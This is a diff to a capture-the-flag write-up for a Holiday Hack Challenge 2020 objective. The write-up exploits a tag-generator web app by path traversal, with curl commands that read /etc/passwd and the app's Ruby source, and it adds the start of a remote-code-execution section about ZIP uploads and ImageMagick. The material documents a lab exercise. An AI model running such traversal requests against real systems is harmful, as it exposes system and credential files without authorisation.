@@ -2,6 +2,8 @@
 
 The objective is to obtain the value of the environment variable `GREETZ` of the [Tag Generator](https://tag-generator.kringlecastle.com/).
 
+## Solution using Path Traversal
+
 It was found that the image download function allows path traversal:
 ```
 curl https://tag-generator.kringlecastle.com/image?id=../../../../../etc/passwd
@@ -22,15 +24,16 @@ PATH=/usr/local/bundle/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sb
 ```
 So the `GREETZ` variable contains **JackFrostWasHere**
 
-**More Information**
+## Solution using RCE
 
 The [Ruby application code](https://github.com/joergschwarzwaelder/hhc2020/blob/master/Objective-8/app.rb) can be downloaded through
 ```
 curl https://tag-generator.kringlecastle.com/image?id=../../../../../app/lib/app.rb --output app.rb
 ```
 This code allows to place uploaded files in a chosen place on the remote system using the ZIP upload function.
+Furthermore the application starts the `convert` tool from  ImageMagick
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbMTkzMzM2MTc4NywtMTQ2NzYxNTI2MiwtMj
-QzOTQyODY2LDEzMTIwNTY0NTMsOTIwNDU1ODY1LC0xNjA2MDc4
-MDQwXX0=
+eyJoaXN0b3J5IjpbLTQ5NTA4NDE3MSwxOTMzMzYxNzg3LC0xND
+Y3NjE1MjYyLC0yNDM5NDI4NjYsMTMxMjA1NjQ1Myw5MjA0NTU4
+NjUsLTE2MDYwNzgwNDBdfQ==
 -->
